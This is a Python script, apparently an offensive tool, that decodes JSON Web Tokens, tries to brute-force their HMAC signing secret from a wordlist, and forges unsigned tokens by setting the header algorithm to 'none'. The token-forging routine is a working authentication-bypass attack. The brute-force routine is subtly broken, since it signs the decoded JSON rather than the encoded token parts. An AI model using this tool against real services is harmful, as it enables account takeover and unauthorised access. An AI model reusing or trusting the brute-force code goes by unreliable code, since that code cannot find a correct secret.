import base64
import json
import hmac 
import hashlib
import sys
import argparse

def jwt_decode(token):
    try:
        token_parts = token.split(".")
        if len(token_parts) != 3:
            raise ValueError("Invalid JWT token format")

        decoded_header = base64.urlsafe_b64decode(token_parts[0] + "==").decode('utf-8')
        decoded_payload = base64.urlsafe_b64decode(token_parts[1] + "==").decode('utf-8')
        signature = token_parts[2]  # Signature is binary data, so no need to decode

        print("Decoded Header: ", decoded_header)
        print("Decoded Payload: ", decoded_payload)

        return decoded_header, decoded_payload, signature

    except UnicodeDecodeError as e:
        print(f"Error decoding JWT part: {e}")
        return None, None, None
    except Exception as e:
        print(f"Error: {e}")
        return None, None, None

def jwt_secret_bruteforce(file_path, token):
    try:
        header_b64, payload_b64, signature_b64 = jwt_decode(token)
        if not all([header_b64, payload_b64, signature_b64]):
            print("Failed to decode JWT. Exiting.")
            return

        params = f'{header_b64}.{payload_b64}'

        with open(file_path, "r") as candidate_keys:
            for key in candidate_keys:
                key = key.strip()
                new_signature = hmac.new(key.encode(), params.encode(), hashlib.sha256).digest()
                new_signature_encoded = base64.urlsafe_b64encode(new_signature).rstrip(b'=').decode('utf-8')
                if new_signature_encoded == signature_b64:
                    print("Secret Found: ", key)
                    break
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Please provide a valid secrets wordlist using the -f option.")

def alg_none(token):
    header, payload, signature = jwt_decode(token)

    if header and payload and signature:
        try:
            # Parse the header as JSON
            header_json = json.loads(header)

            # Change the 'alg' field to 'none'
            header_json['alg'] = 'none'

            # Re-encode the header to base64
            new_header_b64 = base64.urlsafe_b64encode(json.dumps(header_json).encode()).rstrip(b'=').decode('utf-8')

            # Create a new token with the modified header, the original payload, and no signature
            new_token = f'{new_header_b64}.{token.split(".")[1]}.'

            print("Modified JWT with 'none' alg: ", new_token)
            return new_token

        except json.JSONDecodeError as e:
            print(f"Error decoding JWT header as JSON: {e}")
            return None

    

def main():

    parser = argparse.ArgumentParser(description="JWT secret brute-forcing tool.")
    
    parser.add_argument("-f", "--file", type=str, required=False, help="Path to the wordlist.")
    parser.add_argument("-t", "--token", type=str, required=True, help="JSON Web Token (JWT) to brute-force.")
    parser.add_argument("-d","--decode", action="store_true", help="Decode JWT.")
    parser.add_argument("-bf","--bruteforce", action="store_true", help="BruteForce JWT Secret.")
    parser.add_argument("-n","--none", action="store_true", help="None alg scan.")
    
    args = parser.parse_args()
    file_path = args.file
    token = args.token

    if args.decode:
        jwt_decode(token)
    elif args.bruteforce:
        jwt_secret_bruteforce(file_path, token)
    elif args.none:
        alg_none(token)

    return file_path, token

if __name__ == "__main__":
    file_path, token = main()
    print(f"Wordlist File Path: {file_path}")
    print(f"JWT Token: {token}")
